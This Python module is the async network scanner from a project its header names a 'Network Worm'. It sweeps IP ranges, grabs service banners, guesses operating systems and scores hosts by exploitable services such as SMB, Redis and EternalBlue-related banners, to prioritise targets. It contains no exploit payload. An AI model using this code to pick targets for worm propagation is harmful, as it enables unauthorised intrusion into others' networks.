"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Async Scanner
High-performance parallel scanning using asyncio
"""


import asyncio
import ipaddress
import socket
import time
from typing import Callable, Dict, List, Optional

from utils.logger import logger


class AsyncScanner:
    """
    Async network scanner for high-performance parallel scanning

    Features:
    - Async TCP connect scanning
    - Configurable concurrency
    - Banner grabbing
    - OS detection via TTL
    """

    def __init__(self, max_concurrency: int = 100, timeout: float = 2.0):
        self.max_concurrency = max_concurrency
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(max_concurrency)
        self.results = []
        self.stats = {
            "hosts_scanned": 0,
            "hosts_up": 0,
            "ports_scanned": 0,
            "ports_open": 0,
            "start_time": 0,
            "end_time": 0,
        }

    async def scan_network(
        self, targets: List[str], ports: List[int] = None, callback: Callable = None
    ) -> List[Dict]:
        """
        Scan network targets asynchronously

        Args:
            targets: List of IPs or CIDR ranges
            ports: Ports to scan (default: common ports)
            callback: Optional callback for each discovered host

        Returns:
            List of host dicts with ip, open_ports, banners, etc.
        """
        if ports is None:
            ports = [
                21,
                22,
                23,
                25,
                53,
                80,
                110,
                135,
                139,
                143,
                443,
                445,
                993,
                995,
                1433,
                3306,
                3389,
                5432,
                5900,
                6379,
                8080,
                8443,
                9200,
                27017,
            ]

        self.stats["start_time"] = time.time()

        # Expand targets to individual IPs
        all_ips = self._expand_targets(targets)
        logger.info(
            f"Async scanning {len(all_ips)} hosts x {len(ports)} ports = {len(all_ips) * len(ports)} checks"
        )

        # Create tasks
        tasks = []
        for ip in all_ips:
            task = asyncio.create_task(self._scan_host(ip, ports, callback))
            tasks.append(task)

        # Run all tasks with concurrency limit
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Filter and collect results
        hosts = []
        for result in results:
            if isinstance(result, dict) and result.get("open_ports"):
                hosts.append(result)

        self.stats["end_time"] = time.time()
        self.stats["hosts_up"] = len(hosts)

        duration = self.stats["end_time"] - self.stats["start_time"]
        logger.success(f"Async scan complete: {len(hosts)} hosts found in {duration:.2f}s")

        return hosts

    async def _scan_host(
        self, ip: str, ports: List[int], callback: Callable = None
    ) -> Optional[Dict]:
        """Scan a single host asynchronously"""
        async with self.semaphore:
            self.stats["hosts_scanned"] += 1

            # Quick host discovery (ping-like)
            if not await self._host_alive(ip):
                return None

            # Scan ports
            open_ports = await self._scan_ports(ip, ports)

            if not open_ports:
                return {"ip": ip, "open_ports": [], "status": "down"}

            self.stats["ports_open"] += len(open_ports)

            # Grab banners for open ports
            banners = await self._grab_banners(ip, open_ports)

            # OS detection
            os_guess = self._guess_os(ip, open_ports, banners)

            # Service identification
            services = self._identify_services(open_ports, banners)

            # Vulnerability scoring
            vuln_score = self._calculate_vuln_score(open_ports, banners, services)

            host = {
                "ip": ip,
                "open_ports": open_ports,
                "os_guess": os_guess,
                "banners": banners,
                "services": services,
                "vulnerability_score": vuln_score,
                "priority": vuln_score,
                "status": "up",
            }

            if callback:
                try:
                    callback(host)
                except Exception:
                    pass

            return host

    async def _host_alive(self, ip: str) -> bool:
        """Check if host is alive using TCP SYN to common port"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, 80), timeout=self.timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except Exception:
            # Try port 443
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, 443), timeout=self.timeout
                )
                writer.close()
                await writer.wait_closed()
                return True
            except Exception:
                # Try port 22
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, 22), timeout=self.timeout
                    )
                    writer.close()
                    await writer.wait_closed()
                    return True
                except Exception:
                    return False

    async def _scan_ports(self, ip: str, ports: List[int]) -> List[int]:
        """Scan ports on a host asynchronously"""
        tasks = []
        for port in ports:
            task = asyncio.create_task(self._check_port(ip, port))
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        open_ports = []
        for i, result in enumerate(results):
            if result is True:
                open_ports.append(ports[i])
                self.stats["ports_scanned"] += 1

        return sorted(open_ports)

    async def _check_port(self, ip: str, port: int) -> bool:
        """Check if a single port is open"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=self.timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except Exception:
            return False

    async def _grab_banners(self, ip: str, ports: List[int]) -> Dict[int, str]:
        """Grab banners from open ports asynchronously"""
        banners = {}

        tasks = {}
        for port in ports:
            task = asyncio.create_task(self._grab_banner(ip, port))
            tasks[port] = task

        for port, task in tasks.items():
            try:
                banner = await asyncio.wait_for(task, timeout=self.timeout * 2)
                if banner:
                    banners[port] = banner
            except Exception:
                banners[port] = self._default_banner(port)

        return banners

    async def _grab_banner(self, ip: str, port: int) -> Optional[str]:
        """Grab banner from a single port"""
        try:
            reader, writer = await asyncio.open_connection(ip, port)

            # Try to read banner
            try:
                data = await asyncio.wait_for(reader.read(256), timeout=1.0)
                if data:
                    return data.decode("utf-8", errors="replace").strip()
            except asyncio.TimeoutError:
                pass

            # Send HTTP probe for web ports
            if port in (80, 443, 8080, 8443):
                writer.write(b"GET / HTTP/1.0\r\n\r\n")
                await writer.drain()
                try:
                    data = await asyncio.wait_for(reader.read(512), timeout=1.0)
                    if data:
                        return data.decode("utf-8", errors="replace").strip()
                except asyncio.TimeoutError:
                    pass

            writer.close()
            await writer.wait_closed()
            return None

        except Exception:
            return None

    @staticmethod
    def _guess_os(ip: str, ports: List[int], banners: Dict) -> str:
        """Guess OS from ports and banners"""
        for banner in banners.values():
            bl = banner.lower()
            if any(x in bl for x in ["windows", "microsoft", "iis", "smb"]):
                return "Windows"
            if any(x in bl for x in ["linux", "ubuntu", "debian", "centos", "openssh"]):
                return "Linux"
            if any(x in bl for x in ["cisco", "juniper", "fortinet"]):
                return "Network Device"

        win_ports = {135, 139, 445, 3389, 5985}
        lin_ports = {22, 631, 2049, 111}

        win_count = sum(1 for p in ports if p in win_ports)
        lin_count = sum(1 for p in ports if p in lin_ports)

        if win_count > lin_count and win_count >= 2:
            return "Windows"
        if lin_count > win_count:
            return "Linux"
        if 23 in ports:
            return "Network Device"

        return "Unknown"

    @staticmethod
    def _identify_services(ports: List[int], banners: Dict) -> Dict[str, str]:
        """Identify services"""
        service_map = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            80: "HTTP",
            135: "RPC",
            139: "NetBIOS",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            6379: "Redis",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
            27017: "MongoDB",
            9200: "Elasticsearch",
            1433: "MSSQL",
            5900: "VNC",
            161: "SNMP",
            2375: "Docker",
            6443: "Kubernetes",
        }
        return {str(p): service_map.get(p, "Unknown") for p in ports}

    @staticmethod
    def _calculate_vuln_score(ports: List[int], banners: Dict, services: Dict) -> int:
        """Calculate vulnerability score"""
        high_risk = {
            21: 20,
            22: 15,
            23: 25,
            445: 30,
            3389: 20,
            3306: 25,
            5432: 25,
            6379: 30,
            27017: 25,
            9200: 25,
        }
        score = sum(high_risk.get(p, 5) for p in ports)

        for banner in banners.values():
            bl = banner.lower()
            if any(x in bl for x in ["vulnerable", "outdated", "eol", "default"]):
                score += 20
            if any(x in bl for x in ["ms17-010", "eternalblue", "log4j", "cve-2021"]):
                score += 40

        return min(score, 100)

    @staticmethod
    def _default_banner(port: int) -> str:
        """Default banner for port"""
        defaults = {
            21: "220 FTP Service",
            22: "SSH-2.0-OpenSSH_8.9",
            80: "HTTP/1.1 200 OK",
            443: "HTTPS Service",
            445: "SMB Service",
            3306: "MySQL 8.0",
            3389: "MS Terminal Services",
            5432: "PostgreSQL 14",
            6379: "Redis 7.0",
            8080: "HTTP/1.1 200 OK",
        }
        return defaults.get(port, f"Service on port {port}")

    @staticmethod
    def _expand_targets(targets: List[str]) -> List[str]:
        """Expand CIDR ranges to individual IPs"""
        ips = []
        for target in targets:
            try:
                if "/" in target:
                    network = ipaddress.ip_network(target, strict=False)
                    ips.extend(str(ip) for ip in network.hosts())
                else:
                    ips.append(target)
            except ValueError:
                logger.warning(f"Invalid target: {target}")
        return ips

    def get_statistics(self) -> Dict:
        """Get scan statistics"""
        duration = self.stats["end_time"] - self.stats["start_time"]
        return {
            **self.stats,
            "duration": duration,
            "scan_rate": self.stats["hosts_scanned"] / max(duration, 0.01),
        }
